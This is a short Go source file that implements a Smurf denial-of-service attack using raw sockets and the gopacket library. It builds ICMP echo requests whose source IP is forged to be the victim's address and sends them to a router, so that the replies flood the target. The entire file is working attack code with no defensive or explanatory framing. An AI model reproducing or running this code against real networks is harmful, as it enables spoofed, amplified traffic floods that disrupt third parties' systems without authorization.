package main

import (
	"net"
	"syscall"

	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	"github.com/pkg/errors"
)

type smurf struct {
	sockfd  int
	target  net.IP
	router  *syscall.SockaddrInet4 // ICMP6 currently not supported
	payload []byte
}

func newSmurf(target, router net.IP) (*smurf, error) {
	fd, err := syscall.Socket(syscall.AF_INET, syscall.SOCK_RAW, syscall.IPPROTO_ICMP)
	if err != nil {
		return nil, errors.Wrap(err, "could not get raw icmp socket")
	}

	var remote syscall.SockaddrInet4
	copy(remote.Addr[:], router.To4())

	pl, err := spoofedICMP(target, router)
	if err != nil {
		return nil, errors.Wrap(err, "could not build a spoofed payload")
	}

	return &smurf{
		sockfd:  fd,
		target:  target,
		router:  &remote,
		payload: pl,
	}, nil
}

func (s *smurf) send() error {
	return syscall.Sendto(s.sockfd, s.payload, 0, s.router)
}

func spoofedICMP(target, router net.IP) ([]byte, error) {
	buf := gopacket.NewSerializeBuffer()

	serializeOpts := gopacket.SerializeOptions{
		FixLengths:       true,
		ComputeChecksums: true,
	}

	ip := &layers.IPv4{
		SrcIP:    target, // spoofed source IP
		DstIP:    router,
		Protocol: layers.IPProtocolICMPv4,
		Version:  4,
		TTL:      32,
	}

	icmp := &layers.ICMPv4{
		TypeCode: layers.CreateICMPv4TypeCode(layers.ICMPv4TypeEchoRequest, 0),
	}

	err := gopacket.SerializeLayers(buf, serializeOpts, ip, icmp)
	if err != nil {
		return nil, err
	}

	return buf.Bytes(), nil
}
